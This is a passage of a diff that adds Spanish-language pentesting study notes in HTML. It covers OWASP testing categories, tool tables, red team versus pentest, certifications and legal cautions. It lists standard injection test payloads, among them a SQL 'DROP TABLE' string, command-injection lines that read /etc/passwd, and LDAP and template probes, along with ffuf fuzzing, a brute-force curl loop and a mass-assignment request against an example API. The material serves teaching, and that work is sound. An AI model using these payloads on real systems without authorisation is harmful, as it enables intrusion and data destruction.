+        <li>Timeout de sesión</li>
+        <li>Logout efectivo</li>
+        <li>Session fixation</li>
+        <li>CSRF tokens</li>
+    </ul>
+
+    <h5>7. Input Validation Testing</h5>
+    <pre><code># SQL Injection
+' OR '1'='1'--
+1' UNION SELECT NULL,NULL,NULL--
+1'; DROP TABLE users--
+
+# XSS
+
+
+# Command Injection
+; ls -la
+| whoami
+`cat /etc/passwd`
+
+# XXE (XML External Entity)
+
+
+# LDAP Injection
+*)(uid=*))(|(uid=*
+
+# Template Injection
+{{7*7}}
+${7*7}
+<%= 7*7 %></code></pre>
+
+    <h5>8. Error Handling</h5>
+    <ul>
+        <li>Mensajes de error verbosos que revelan información</li>
+        <li>Stack traces expuestos</li>
+        <li>Códigos de error que facilitan enumeración</li>
+    </ul>
+
+    <h5>9. Cryptography Testing</h5>
+    <ul>
+        <li>Uso de protocolos obsoletos (SSL, TLS 1.0/1.1)</li>
+        <li>Cifrados débiles (RC4, DES)</li>
+        <li>Certificados inválidos o expirados</li>
+        <li>Datos sensibles sin cifrar</li>
+    </ul>
+
+    <h5>10. Business Logic Testing</h5>
+    <ul>
+        <li>Manipulación de precios en carrito de compra</li>
+        <li>Race conditions</li>
+        <li>Bypass de flujos de negocio</li>
+        <li>Abuso de funcionalidades</li>
+    </ul>
+
+    <h5>11. Client-Side Testing</h5>
+    <ul>
+        <li>DOM-based XSS</li>
+        <li>JavaScript malicioso</li>
+        <li>Almacenamiento inseguro en cliente (localStorage)</li>
+        <li>Clickjacking</li>
+    </ul>
+
+    <h5>12. API Testing</h5>
+    <pre><code># Enumeración de endpoints
+# Fuzzing de API
+ffuf -u https://api.acme.com/v1/FUZZ -w api-endpoints.txt
+
+# Falta de rate limiting
+for i in {1..1000}; do curl https://api.acme.com/login; done
+
+# Mass assignment
+# Enviar campos adicionales no esperados
+curl -X POST https://api.acme.com/users \
+  -d '{"username":"test","role":"admin"}'
+
+# Inyección en GraphQL
+{users{id,username,password}}
+
+# Verificar autenticación en todos los endpoints
+curl https://api.acme.com/admin/users
+# Sin token debería retornar 401</code></pre>
+
+    <h3>9.5 Herramientas de pentesting</h3>
+    <table class="table table-striped">
+        <thead>
+            <tr>
+                <th>Categoría</th>
+                <th>Herramientas</th>
+                <th>Uso</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr><td>Reconocimiento</td><td>nmap, masscan, subfinder, amass</td><td>Escaneo de red y enumeración</td></tr>
+            <tr><td>Web scanning</td><td>Burp Suite, OWASP ZAP, Nikto</td><td>Análisis de aplicaciones web</td></tr>
+            <tr><td>Vulnerability scanning</td><td>Nessus, OpenVAS, Qualys</td><td>Escaneo automatizado</td></tr>
+            <tr><td>Explotación</td><td>Metasploit, SQLmap, BeEF</td><td>Explotación de vulnerabilidades</td></tr>
+            <tr><td>Password cracking</td><td>Hashcat, John the Ripper, Hydra</td><td>Cracking de contraseñas</td></tr>
+            <tr><td>Wireless</td><td>Aircrack-ng, Kismet, Wifite</td><td>Testing de redes WiFi</td></tr>
+            <tr><td>Post-explotación</td><td>Mimikatz, BloodHound, PowerSploit</td><td>Escalada y movimiento lateral</td></tr>
+            <tr><td>Reporting</td><td>Dradis, Faraday, Serpico</td><td>Gestión de hallazgos y reportes</td></tr>
+        </tbody>
+    </table>
+
+    <h3>9.6 Distribuciones especializadas</h3>
+    <ul>
+        <li><strong>Kali Linux:</strong> distribución más popular, 600+ herramientas preinstaladas</li>
+        <li><strong>Parrot Security OS:</strong> alternativa ligera a Kali</li>
+        <li><strong>BlackArch:</strong> basada en Arch Linux, 2800+ herramientas</li>
+        <li><strong>Pentoo:</strong> basada en Gentoo</li>
+    </ul>
+
+    <h3>9.7 Red Team vs Penetration Testing</h3>
+    <table class="table table-striped">
+        <thead>
+            <tr>
+                <th>Aspecto</th>
+                <th>Penetration Testing</th>
+                <th>Red Team</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Objetivo</td>
+                <td>Encontrar máximo de vulnerabilidades</td>
+                <td>Lograr objetivos específicos (acceso a datos, persistencia)</td>
+            </tr>
+            <tr>
+                <td>Duración</td>
+                <td>1-2 semanas</td>
+                <td>Semanas a meses</td>
+            </tr>
+            <tr>
+                <td>Alcance</td>
+                <td>Definido y limitado</td>
+                <td>Amplio, puede incluir físico y social</td>
+            </tr>
+            <tr>
+                <td>Sigilo</td>
+                <td>No prioritario</td>
+                <td>Crítico (simular APT)</td>
+            </tr>
+            <tr>
+                <td>Conocimiento</td>
+                <td>Puede ser white/grey box</td>
+                <td>Típicamente black box</td>
+            </tr>
+            <tr>
+                <td>Reporte</td>
+                <td>Lista exhaustiva de vulnerabilidades</td>
+                <td>Cadenas de ataque, TTPs, gaps en detección</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3>9.8 Certificaciones de pentesting</h3>
+    <table class="table table-striped">
+        <thead>
+            <tr>
+                <th>Certificación</th>
+                <th>Organización</th>
+                <th>Nivel</th>
+                <th>Enfoque</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr><td>CEH (Certified Ethical Hacker)</td><td>EC-Council</td><td>Entry</td><td>Fundamentos de hacking ético</td></tr>
+            <tr><td>OSCP (Offensive Security Certified Professional)</td><td>Offensive Security</td><td>Intermediate</td><td>Pentest práctico, examen hands-on 24h</td></tr>
+            <tr><td>PNPT (Practical Network Penetration Tester)</td><td>TCM Security</td><td>Intermediate</td><td>Pentest de red, Active Directory</td></tr>
+            <tr><td>eWPT (eLearnSecurity Web Penetration Tester)</td><td>eLearnSecurity</td><td>Intermediate</td><td>Web application pentesting</td></tr>
+            <tr><td>OSWE (Offensive Security Web Expert)</td><td>Offensive Security</td><td>Advanced</td><td>Web exploitation avanzado</td></tr>
+            <tr><td>OSEP (Offensive Security Experienced Penetration Tester)</td><td>Offensive Security</td><td>Advanced</td><td>Evasión de defensas, AD</td></tr>
+            <tr><td>GPEN (GIAC Penetration Tester)</td><td>GIAC/SANS</td><td>Intermediate</td><td>Pentest general</td></tr>
+            <tr><td>GXPN (GIAC Exploit Researcher and Advanced Penetration Tester)</td><td>GIAC/SANS</td><td>Advanced</td><td>Exploit development</td></tr>
+        </tbody>
+    </table>
+
+    <h3>9.9 Consideraciones legales y éticas</h3>
+    <div class="alert alert-danger">
+        <h5>⚠️ IMPORTANTE</h5>
+        <ul class="mb-0">
+            <li><strong>Autorización por escrito:</strong> SIEMPRE obtener permiso explícito antes de realizar cualquier test</li>
+            <li><strong>Alcance definido:</strong> solo probar sistemas autorizados</li>
+            <li><strong>Leyes aplicables:</strong> conocer legislación local (en España: Código Penal art. 197, 264)</li>
+            <li><strong>Confidencialidad:</strong> NDA, proteger información del cliente</li>
+            <li><strong>Responsabilidad:</strong> seguro de responsabilidad profesional</li>
+            <li><strong>No causar daño:</strong> evitar DoS, pérdida de datos, interrupciones</li>
+        </ul>
+    </div>
+
+    <h3>9.10 Buenas prácticas</h3>
+    <div class="alert alert-success">
+        <h5>Recomendaciones</h5>
+        <ul class="mb-0">
+            <li><strong>Documentar todo:</strong> comandos ejecutados, resultados, timestamps</li>
+            <li><strong>Comunicación continua:</strong> informar hallazgos críticos inmediatamente</li>
+            <li><strong>Backup antes de explotar:</strong> preservar estado original</li>
+            <li><strong>Validar hallazgos:</strong> evitar falsos positivos</li>
+            <li><strong>Priorizar por riesgo:</strong> CVSS, facilidad de explotación, impacto</li>
+            <li><strong>Recomendaciones accionables:</strong> no solo "actualizar", sino cómo y qué</li>
+            <li><strong>Retest:</strong> verificar que remediaciones son efectivas</li>
+        </ul>
+    </div>
+
+    <div class="alert alert-info">
+        <h5>💡 Para examen</h5>
+        <ul class="mb-0">
+            <li><strong>PTES:</strong> 7 fases (Pre-engagement, Intelligence, Threat Modeling, Vulnerability Analysis, Exploitation, Post-exploitation, Reporting)</li>
+            <li><strong>OWASP Testing Guide:</strong> 12 categorías específicas para web apps</li>
+            <li><strong>Black/White/Grey box:</strong> nivel de conocimiento previo</li>
+            <li><strong>Pentest vs Red Team:</strong> pentest busca vulnerabilidades, red team simula adversario real</li>
+            <li><strong>CVSS:</strong> Crítica (9-10), Alta (7-8.9), Media (4-6.9), Baja (0.1-3.9)</li>
+            <li><strong>Siempre autorización por escrito</strong> antes de cualquier test</li>
+        </ul>
+    </div>
 
     <h2>10. Cumplimiento y normativa</h2>
     <p>Ejemplos de marcos y normativas relevantes: ISO 27001, NIST CSF, GDPR (protección de datos), PCI-DSS (tarjetas), ENS en España. Importancia: requisitos legales y de auditoría, deber documental y medidas técnicas/organizativas.</p>
